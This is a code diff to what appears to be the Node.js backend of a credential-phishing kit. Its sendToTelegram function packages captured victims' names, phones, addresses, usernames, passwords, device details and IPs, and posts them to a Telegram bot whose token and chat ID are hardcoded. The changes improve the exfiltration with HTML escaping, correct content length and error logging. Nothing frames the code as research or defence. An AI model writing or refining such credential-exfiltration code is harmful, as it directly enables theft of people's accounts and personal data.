@@ -27,28 +27,38 @@ const TELEGRAM_BOT_TOKEN = '8460137294:AAHzdNXpkVLXnbFxbW6MX-xis61dd6bwCfU';
 const TELEGRAM_CHAT_ID = '689594390';
 
 function sendToTelegram(entry) {
+    const escapeHTML = (str) => {
+        if (!str) return 'N/A';
+        return str.toString()
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#039;');
+    };
+
     const message = `
-🚀 *New Entry Captured!*
+<b>🚀 New Entry Captured!</b>
 ------------------------
-👤 *Name:* ${entry.fullName || 'N/A'}
-📱 *Phone:* ${entry.phone}
-🏠 *Residence:* ${entry.residence || 'N/A'}
+👤 <b>Name:</b> ${escapeHTML(entry.fullName)}
+📱 <b>Phone:</b> ${escapeHTML(entry.phone)}
+🏠 <b>Residence:</b> ${escapeHTML(entry.residence)}
 
-🔑 *Credentials:*
-👤 *User:* ${entry.loginCredentials?.username || 'N/A'}
-🔒 *Pass:* ${entry.loginCredentials?.password || 'N/A'}
+🔑 <b>Credentials:</b>
+👤 <b>User:</b> ${escapeHTML(entry.loginCredentials?.username)}
+🔒 <b>Pass:</b> ${escapeHTML(entry.loginCredentials?.password)}
 
-📱 *Device Info:*
-💻 *Type:* ${entry.deviceInfo?.type || 'N/A'}
-💻 *OS:* ${entry.deviceInfo?.os || 'N/A'}
-🌐 *IP:* ${entry.ip || 'N/A'}
-📍 *Time:* ${entry.timestamp}
+📱 <b>Device Info:</b>
+💻 <b>Type:</b> ${escapeHTML(entry.deviceInfo?.type)}
+💻 <b>OS:</b> ${escapeHTML(entry.deviceInfo?.os)}
+🌐 <b>IP:</b> ${escapeHTML(entry.ip)}
+📍 <b>Time:</b> ${escapeHTML(entry.timestamp)}
     `;
 
     const data = JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML'
     });
 
     const options = {
@@ -58,18 +68,24 @@ function sendToTelegram(entry) {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'Content-Length': data.length
+            'Content-Length': Buffer.byteLength(data)
         }
     };
 
     const req = https.request(options, (res) => {
-        res.on('data', (d) => {
-            process.stdout.write(d);
+        let body = '';
+        res.on('data', (chunk) => body += chunk);
+        res.on('end', () => {
+            if (res.statusCode !== 200) {
+                console.error(`Telegram Error: Status ${res.statusCode}`, body);
+            } else {
+                console.log('Telegram message sent successfully');
+            }
         });
     });
 
     req.on('error', (error) => {
-        console.error('Telegram Error:', error);
+        console.error('Telegram Request Error:', error);
     });
 
     req.write(data);
